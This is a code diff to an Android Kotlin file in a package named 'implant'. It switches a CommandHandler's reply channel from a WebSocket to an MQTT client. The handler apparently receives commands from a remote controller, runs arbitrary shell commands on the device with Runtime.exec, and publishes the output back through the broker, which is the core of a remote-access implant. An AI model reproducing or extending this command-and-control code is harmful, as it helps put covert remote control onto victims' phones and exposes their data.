@@ -4,11 +4,16 @@ import android.content.Context
 import android.util.Log
 import com.cooperthecoder.implant.data.SharedPreferencesQuery
 import com.cooperthecoder.implant.data.UploadQueue
-import okhttp3.WebSocket
+import org.eclipse.paho.android.service.MqttAndroidClient
+import org.eclipse.paho.client.mqttv3.MqttMessage
 import java.io.BufferedReader
 import java.io.InputStreamReader
 
-class CommandHandler(context: Context, val command: Command, val socket: WebSocket) {
+class CommandHandler(context: Context, val command: Command, val client: MqttAndroidClient) {
+
+    companion object {
+        val TAG: String = CommandHandler::class.java.name
+    }
 
     val context: Context = context.applicationContext
 
@@ -51,11 +56,11 @@ class CommandHandler(context: Context, val command: Command, val socket: WebSock
     }
 
     private fun handleExecute(shellCommand: String) {
-        Log.d(CommandListener.TAG, "Executing: $shellCommand")
+        Log.d(TAG, "Executing: $shellCommand")
         val process = try {
             Runtime.getRuntime().exec(shellCommand)
         } catch (e: Exception) {
-            Log.e(CommandListener.TAG, "Error running command", e)
+            Log.e(TAG, "Error running command", e)
             e.message?.let { reply("", it) }
             return
         }
@@ -103,6 +108,8 @@ class CommandHandler(context: Context, val command: Command, val socket: WebSock
                 .arguments(arguments)
                 .build()
 
-        socket.send(command.json())
+        val message = MqttMessage()
+        message.payload = command.json().toByteArray()
+        client.publish(client.clientId, message)
     }
 }
